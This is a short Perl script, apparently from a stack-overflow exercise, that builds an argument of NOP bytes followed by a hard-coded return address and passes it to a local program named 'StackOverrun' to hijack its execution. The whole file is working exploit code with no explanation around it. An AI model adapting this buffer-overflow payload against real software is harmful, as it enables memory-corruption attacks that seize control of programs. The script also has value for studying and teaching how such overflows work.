#!/usr/bin/perl -w

$arg = "\x90"x13 ."\xE1\x05\x40";
$cmd = "./StackOverrun ".$arg;

system($cmd);